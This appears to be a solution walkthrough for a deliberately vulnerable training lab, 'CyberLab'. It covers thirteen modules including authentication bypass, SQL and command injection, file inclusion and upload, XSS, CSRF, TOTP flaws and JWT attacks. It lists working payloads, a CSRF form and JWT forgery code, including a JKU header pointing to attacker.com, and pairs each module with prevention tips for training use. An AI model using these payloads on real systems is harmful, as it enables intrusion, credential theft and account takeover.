# CyberLab Walkthrough

This walkthrough provides step-by-step solutions, payloads, and explanations for every challenge module in CyberLab. Each section covers the vulnerability, exploitation techniques, payloads, and prevention tips for all difficulty levels (Easy, Medium, Hard, Impossible).

---

## 1. Auth Bypass
**Vulnerability:** Authentication bypass allows attackers to access restricted areas without valid credentials.

### Easy
- Try default credentials (e.g., admin:admin, test:test).
- Bypass login by submitting empty or common values.
- Example: `admin' OR '1'='1` in username field.

### Medium
- Try SQL injection in login form: `admin'--` or `admin' OR 1=1--`.
- Check for logic flaws (e.g., password not checked).

### Hard
- Inspect cookies/session tokens for predictable values.
- Try manipulating session cookies (e.g., set `isAdmin=true`).

### Impossible
- Strong validation, secure session management, and input sanitization prevent bypass.

**Prevention:**
- Use parameterized queries, strong password policies, and secure session management.

---

## 2. Brute Force
**Vulnerability:** Repeatedly guessing credentials to gain access.

### Easy
- Use simple tools (Hydra, Burp Intruder) to automate login attempts.
- Try common passwords: `password`, `123456`, `admin`.

### Medium
- Rate limiting may be present; slow down attack or use distributed brute force.
- Try username enumeration.

### Hard
- CAPTCHA or account lockout after several failed attempts.
- Try bypassing CAPTCHA (see Insecure Captcha module).

### Impossible
- Strong rate limiting, account lockout, and CAPTCHA.

**Prevention:**
- Implement rate limiting, account lockout, and CAPTCHA.

---

## 3. CSRF (Cross-Site Request Forgery)
**Vulnerability:** Attacker tricks a user into submitting unwanted requests.

### Easy
- Create a simple HTML form that submits a request to the vulnerable endpoint.
- Example:
  ```html
  <form action="http://target/change-password" method="POST">
    <input name="password" value="hacked" />
    <input type="submit" />
  </form>
  ```
- Send link to victim; if logged in, password changes.

### Medium
- CSRF token may be present but predictable or not validated.
- Try reusing or guessing token.

### Hard
- Token is random and validated; try stealing token via XSS.

### Impossible
- Double-submit cookies, SameSite cookies, and strict token validation.

**Prevention:**
- Use CSRF tokens, SameSite cookies, and verify origin headers.

---

## 4. Command Injection
**Vulnerability:** Unsanitized user input passed to system commands.

### Easy
- Input: `; whoami` or `&& whoami` in vulnerable field.
- Observe command output.

### Medium
- Input filtering; try encoding or using alternate separators: `| whoami`, `$(whoami)`.

### Hard
- Blacklist/whitelist in place; try bypassing with obfuscated payloads: `$(echo whoami)`.

### Impossible
- Input sanitized, commands run in restricted environment.

**Prevention:**
- Use parameterized APIs, validate and sanitize input, avoid direct command execution.

---

## 5. File Inclusion (LFI/RFI)
**Vulnerability:** User input used to include files on the server.

### Easy
- Input: `../../../../etc/passwd` in file parameter.
- Try `/proc/self/environ` for code execution.

### Medium
- Input filtering; try URL encoding: `..%2F..%2F..%2Fetc%2Fpasswd`.

### Hard
- Only whitelisted files allowed; try path traversal with null byte: `../../../../etc/passwd%00`.

### Impossible
- Strict validation, no dynamic inclusion.

**Prevention:**
- Validate file paths, use whitelists, avoid user-controlled file inclusion.

---

## 6. File Upload
**Vulnerability:** Uploading malicious files to the server.

### Easy
- Upload a web shell (e.g., `shell.php`).
- Access uploaded file via direct URL.

### Medium
- File type/extension filtering; try double extension: `shell.php.jpg`.
- Try uploading `.htaccess` to change server behavior.

### Hard
- Content inspection; try bypassing with polyglot files or exploiting image metadata.

### Impossible
- Strict MIME/type/content checks, sandboxed uploads.

**Prevention:**
- Validate file type, extension, and content; store files outside web root.

---

## 7. Insecure Captcha
**Vulnerability:** Weak or predictable CAPTCHA allows automated attacks.

### Easy
- CAPTCHA is static or easily guessable (e.g., always `1234`).
- Automate form submission with script.

### Medium
- CAPTCHA changes but is predictable; try brute-forcing.

### Hard
- CAPTCHA is dynamic; try OCR or bypass via session manipulation.

### Impossible
- Strong CAPTCHA, rate limiting, and bot detection.

**Prevention:**
- Use strong, dynamic CAPTCHA and rate limiting.

---

## 8. SQL Injection
**Vulnerability:** Unsanitized input in SQL queries.

### Easy
- Input: `' OR 1=1--` in vulnerable field.
- Use SQLMap for automated exploitation.

### Medium
- Input filtering; try alternate payloads: `admin' OR 'a'='a`.

### Hard
- Blind SQLi; use time-based or boolean-based payloads:
  - `1' AND SLEEP(5)--`
  - `1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--`

### Impossible
- Parameterized queries, strict input validation.

**Prevention:**
- Use prepared statements, validate input, limit error messages.

---

## 9. Blind SQL Injection
**Vulnerability:** SQL injection with no visible error/output.

### Easy
- Use boolean-based payloads:
  - `1' AND 1=1--` (returns true)
  - `1' AND 1=2--` (returns false)
- Use time-based payloads:
  - `1' AND SLEEP(5)--`

### Medium
- Try extracting data character by character using conditional queries.

### Hard
- Advanced time-based or out-of-band techniques.

### Impossible
- Parameterized queries, no user-controlled SQL.

**Prevention:**
- Use prepared statements, validate input, limit error messages.

---

## 10. Weak Session Management
**Vulnerability:** Predictable or insecure session tokens.

### Easy
- Inspect cookies for predictable values (e.g., `session=1`).
- Try session fixation: set your own session ID before login.

### Medium
- Session tokens are random but not invalidated on logout.
- Try reusing old session tokens.

### Hard
- Secure tokens, but session timeout is too long.
- Try session hijacking via XSS or network sniffing.

### Impossible
- Secure, random tokens, proper invalidation, short timeout.

**Prevention:**
- Use secure, random session tokens, invalidate on logout, set short timeouts.

---

## 11. XSS (Cross-Site Scripting)
**Vulnerability:** Unsanitized user input rendered in browser.

### Easy
- Input: `<script>alert(1)</script>` in vulnerable field.
- Try event-based payloads: `<img src=x onerror=alert(1)>`.

### Medium
- Input filtering; try encoded payloads: `%3Cscript%3Ealert(1)%3C%2Fscript%3E`.
- Try breaking out of attributes: `" onmouseover="alert(1)`.

### Hard
- CSP or output encoding; try SVG or JavaScript URI payloads.

### Impossible
- Strict output encoding, CSP, input validation.

**Prevention:**
- Encode output, validate input, use CSP.

---

## 12. TOTP/2FA Authentication
**Vulnerability:** Time-Based One-Time Password implementation flaws allowing authentication bypass.

### Easy - The Predictable Token
- **Vulnerability**: Weak secret generation and 10-minute time window
- **Exploitation**:
  - Secret follows predictable pattern: `base64(username_secret_123)`
  - Brute-force 6-digit codes within 10-minute window
  - Code reuse possible within same time window
- **Payloads**:
  - Generate secret: `btoa("admin_secret_123").substring(0,16).toUpperCase()`
  - Brute force: Try all codes from `000000` to `999999`
  - Timing: Attack window is 600 seconds (10 minutes)
- **Steps**:
  1. Login with valid credentials (admin/admin123)
  2. Enable 2FA and note the predictable secret pattern
  3. Calculate expected TOTP codes for current time window
  4. Use brute force within the extended time window

### Medium - The Flawed Validation
- **Vulnerability**: Pre-authentication bypass and no rate limiting
- **Exploitation**:
  - Session state confusion allows bypass
  - No rate limiting on 2FA attempts
  - Timing attacks on code validation
- **Payloads**:
  - Pre-auth bypass: Check `sessionStorage.getItem('preauth_user')`
  - Rate limiting test: Submit unlimited 2FA attempts
  - Timing attack: Measure response time differences
- **Steps**:
  1. Intercept login process and note session handling
  2. Exploit pre-authentication session state
  3. Brute force 2FA codes without rate limiting
  4. Use timing differences to optimize attacks

### Hard - The Cryptographic Leak
- **Vulnerability**: Secret exposed in browser developer tools
- **Exploitation**:
  - TOTP secret leaked in console logs
  - Secret stored in HTML data attributes
  - Network responses contain sensitive data
- **Payloads**:
  - Check console: `console.log` messages reveal secrets
  - HTML inspection: `document.getElementById('hidden-secret').getAttribute('data-secret')`
  - Network tab: API responses leak secret keys
- **Steps**:
  1. Login and enable 2FA
  2. Open Browser Developer Tools (F12)
  3. Check Console tab for debug information
  4. Inspect Network tab for API responses
  5. Check HTML source for hidden data attributes
  6. Use leaked secret in authenticator app

**Prevention:**
- Use cryptographically secure secret generation
- Implement proper rate limiting (3-5 attempts max)
- Never expose secrets in client-side code
- Use constant-time comparisons for validation
- Implement proper session management

---

## 13. JWT Authentication
**Vulnerability:** JSON Web Token implementation flaws allowing authentication bypass.

### Easy - The None Algorithm
- **Vulnerability**: Server accepts 'none' algorithm and uses weak HMAC secret
- **Exploitation**:
  - Remove signature and set algorithm to 'none'
  - Brute force weak HMAC secret ('secret')
  - Modify payload without signature validation
- **Payloads**:
  ```javascript
  // None algorithm attack
  const header = {"alg": "none", "typ": "JWT"};
  const payload = {"sub": "admin", "username": "admin", "role": "admin"};
  const token = btoa(JSON.stringify(header)) + "." + btoa(JSON.stringify(payload)) + ".";
  
  // Weak secret brute force
  const weakSecrets = ['secret', 'key', 'cyberlab', '123456'];
  ```
- **Steps**:
  1. Obtain valid JWT token through normal login
  2. Decode JWT header and payload
  3. Change algorithm to 'none' and remove signature
  4. Modify payload (role: 'admin', username: 'admin')
  5. Re-encode and submit modified token

### Medium - Algorithm Confusion
- **Vulnerability**: Server doesn't validate algorithm type, allowing HS256/RS256 confusion
- **Exploitation**:
  - Obtain RSA public key from `/public-key` endpoint
  - Sign JWT using public key as HMAC secret
  - Server validates using same public key
- **Payloads**:
  ```javascript
  // Algorithm confusion attack
  const header = {"alg": "HS256", "typ": "JWT"};
  const payload = {"sub": "admin", "username": "admin", "role": "admin"};
  const publicKey = "-----BEGIN PUBLIC KEY-----...";
  const signature = hmacSha256(publicKey, header + "." + payload);
  ```
- **Steps**:
  1. Access `/public-key` endpoint to obtain RSA public key
  2. Create JWT with HS256 algorithm
  3. Sign token using public key as HMAC secret
  4. Submit token - server will validate using public key as HMAC key
  5. Authentication succeeds due to algorithm confusion

### Hard - JKU Header Injection
- **Vulnerability**: Server trusts user-controlled JKU header for key fetching
- **Exploitation**:
  - Host malicious JWK Set on attacker domain
  - Set JKU header to point to malicious endpoint
  - Server fetches attacker's public key
- **Payloads**:
  ```javascript
  // JKU injection attack
  const header = {
    "alg": "RS256", 
    "typ": "JWT",
    "jku": "https://attacker.com/.well-known/jwks.json"
  };
  const payload = {"sub": "admin", "username": "admin", "role": "admin"};
  // Sign with attacker's private key
  ```
- **Malicious JWK Set**:
  ```json
  {
    "keys": [{
      "kty": "RSA",
      "kid": "1",
      "use": "sig",
      "n": "attacker_public_key_modulus",
      "e": "AQAB"
    }]
  }
  ```
- **Steps**:
  1. Register HTTPS domain (e.g., GitHub Pages)
  2. Host malicious JWK Set at `/.well-known/jwks.json`
  3. Generate RSA key pair for signing
  4. Create JWT with JKU header pointing to malicious domain
  5. Sign JWT with attacker's private key
  6. Server fetches attacker's public key and validates successfully

**Prevention:**
- Explicitly specify and validate expected algorithm
- Never accept 'none' algorithm in production
- Whitelist trusted JKU domains
- Use separate keys for signing and verification
- Implement proper key management and rotation

---

## References
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [TryHackMe Walkthroughs](https://tryhackme.com/)

---

This guide is for educational purposes only. Always test in a safe, legal environment.
